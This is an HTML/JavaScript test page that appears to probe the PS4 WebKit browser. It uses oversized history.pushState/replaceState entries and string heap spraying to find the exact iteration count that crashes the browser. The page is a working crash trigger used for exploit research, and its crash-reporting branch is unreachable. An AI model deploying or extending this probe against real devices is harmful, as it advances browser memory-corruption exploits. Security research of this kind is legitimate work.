<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit ‚Äì Threshold Binary Search</title>

</head>
<body>
<h2>üéØ PS4 WebKit ‚Äì Exact Threshold Detection</h2>

<button onclick="runBinarySearch()">BINARY SEARCH ‚Äì Find exact crash iteration</button>
<button onclick="runTest(35)">TEST ‚Äì 35 iterations</button>
<button onclick="runTest(40)">TEST ‚Äì 40 iterations</button>
<button onclick="runTest(42)">TEST ‚Äì 42 iterations</button>
<button onclick="runTest(44)">TEST ‚Äì 44 iterations</button>
<button onclick="runTest(46)">TEST ‚Äì 46 iterations</button>
<button onclick="runTest(48)">TEST ‚Äì 48 iterations (known crash)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls=""){ 
  const span = document.createElement("span");
  if(cls) span.className = cls;
  span.textContent = m + "\n";
  logEl.appendChild(span);
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;

let heap = [];
let sharedState = { i: 0, p: "" };

// -------------------------------------------------
// Binary search for exact threshold
// -------------------------------------------------
async function runBinarySearch(){
  logEl.textContent = "";
  log("=== BINARY SEARCH FOR EXACT THRESHOLD ===", "critical");
  log("Known: 30 iters = safe, 48 iters = crash\n");
  
  const tests = [
    { iters: 39, desc: "Midpoint of 30-48" },
    { iters: 44, desc: "Midpoint of 39-48" },
    { iters: 41, desc: "Midpoint of 39-44" },
    { iters: 42, desc: "Test 42" },
    { iters: 43, desc: "Test 43" }
  ];
  
  for(const test of tests){
    log(`\n${"=".repeat(50)}`, "warn");
    log(`[TEST] ${test.iters} iterations - ${test.desc}`, "warn");
    log("=".repeat(50), "warn");
    
    const result = await runTest(test.iters);
    
    if(result === "crash"){
      log(`‚ùå CRASHED at ${test.iters} iterations`, "critical");
      log(`Threshold is BELOW ${test.iters}\n`);
      break;
    } else {
      log(`‚úÖ SURVIVED ${test.iters} iterations`, "success");
      log(`Threshold is ABOVE ${test.iters}\n`);
    }
    
    await sleep(500);
  }
  
  log("\n=== BINARY SEARCH COMPLETE ===");
}

// -------------------------------------------------
// Core test function
// -------------------------------------------------
async function runTest(iterations){
  heap = [];
  sharedState = { i: 0, p: "" };
  
  log(`\n[START] Running ${iterations} iterations`);
  
  let size = BASE;
  for(let i=0; i<iterations; i++){
    sharedState.i = i;
    sharedState.p = "A".repeat(size);
    heap.push("G".repeat(32768));
    
    if(i % 5 === 0 || i === iterations - 1){
      log(`  [ITER ${i}] size=${size}, total=${(size/1024).toFixed(0)}KB`);
    }
    
    history.pushState(sharedState, "", "#"+sharedState.p);
    history.replaceState(sharedState, "", "#"+sharedState.p);
    
    if(i % 6 === 0){
      setTimeout(()=>history.back(), 0);
    }
    
    size += STEP;
    await sleep(3);
  }
  
  log(`[END] Completed ${iterations} iterations`);
  await sleep(500);
  
  // If we reach here, it didn't crash
  return "survived";
}

log("Ready. Strategies:");
log("1. BINARY SEARCH - automated sequential testing");
log("2. Individual buttons - manual testing");
log("\nRecommended: Start with BINARY SEARCH");
</script>
</body>
</html>
